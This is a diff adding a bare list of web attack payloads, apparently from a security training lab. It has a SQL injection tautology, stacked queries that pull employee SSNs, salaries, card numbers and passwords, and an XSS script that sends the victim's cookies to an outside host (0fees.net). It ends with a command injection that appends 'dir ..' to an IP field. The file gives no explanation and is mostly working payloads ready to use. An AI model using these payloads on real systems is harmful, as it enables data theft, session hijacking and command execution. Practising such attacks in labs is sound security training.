@@ -1,0 +1,9 @@
+' or '1' = '1
+112; SELECT employee.userid, employee.first_name, employee.last_name, employee.ssn, employee.title, employee.phone, employee.address1, employee.address2, employee.manager, employee.start_date, employee.salary, employee.ccn, employee.ccn_limit, employee.disciplined_date, employee.disciplined_notes, employee.personal_description FROM employee,ownership WHERE employee.userid = ownership.employee_id and ownership.employer_id = 112 and ownership.employee_id = 112;--
+112; SELECT employee.userid, employee.first_name, employee.last_name, employee.password ssn, employee.title, employee.phone, employee.address1, employee.address2, employee.manager, employee.start_date, employee.salary, employee.ccn, employee.ccn_limit, employee.disciplined_date, employee.disciplined_notes, employee.personal_description FROM employee,ownership WHERE employee.userid = ownership.employee_id and ownership.employer_id = 112 and ownership.employee_id = 112;--
+112; SELECT employee.userid, employee.first_name, employee.last_name, employee.password ssn, employee.title, employee.phone, employee.address1, employee.address2, employee.manager, employee.start_date, employee.salary, employee.ccn, employee.ccn_limit, employee.disciplined_date, employee.disciplined_notes, employee.personal_description FROM employee,ownership WHERE employee.userid = ownership.employee_id and ownership.employer_id = 112 and ownership.employee_id = 112;--
+
+<SCRIPT>alert(document.cookie);</SCRIPT>
+<script>location.href = 'http://www.0fees.net/cookies.php?cookie='+document.cookie;</script>﻿
+
+8.8.8.|dir ..
